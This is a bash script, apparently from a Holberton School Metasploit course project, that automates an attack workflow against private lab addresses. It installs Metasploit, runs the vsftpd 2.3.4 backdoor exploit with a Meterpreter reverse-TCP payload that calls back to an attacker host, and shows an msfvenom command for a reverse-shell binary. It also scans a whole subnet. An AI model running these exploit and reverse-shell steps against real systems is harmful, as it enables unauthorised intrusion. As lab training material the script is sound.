#!/usr/bin/env bash
# metasploit_workflow.sh
# Holberton School – 0x03 Metasploit Basics Project
# Author: Joshua Santiago
# Description: Automates setup and use of Metasploit with PostgreSQL and logs test actions.

# ========== Part 1: Environment Setup ==========
echo "[*] Updating system and installing Metasploit + PostgreSQL..."
sudo apt update -y
sudo apt install -y metasploit-framework postgresql postgresql-contrib

echo "[*] Starting PostgreSQL service..."
sudo systemctl start postgresql
sudo systemctl enable postgresql

echo "[*] Creating Metasploit database and user..."
sudo -u postgres createuser --superuser msf_user 2>/dev/null || echo "[!] msf_user already exists"
sudo -u postgres createdb -O msf_user msf_db 2>/dev/null || echo "[!] msf_db already exists"

echo "[*] Initializing Metasploit database..."
msfdb init

# ========== Part 2: Exploit vsftpd_234_backdoor ==========
echo "[*] Launching Metasploit to run VSFTPD exploit..."
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.0.105
set LHOST 192.168.0.10
set LPORT 4444
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run -z
notes add -t host -n 'VSFTPD backdoor tested against 192.168.0.105'
loot -t csv
exit -y
"

# ========== Part 3: Payload Creation ==========
# This should be run manually before this script or outside of it:
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o payload.elf

# ========== Part 4: Port Scan ==========
echo "[*] Launching port scan on 192.168.0.0/24..."
msfconsole -q -x "
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.0/24
set THREADS 30
run
notes add -t host -n 'TCP port scan completed on subnet'
loot -t csv
exit -y
"

# ========== Part 5: Wrap-Up ==========
echo "[✓] Script completed. Check ~/.msf4/loot/ for exported results."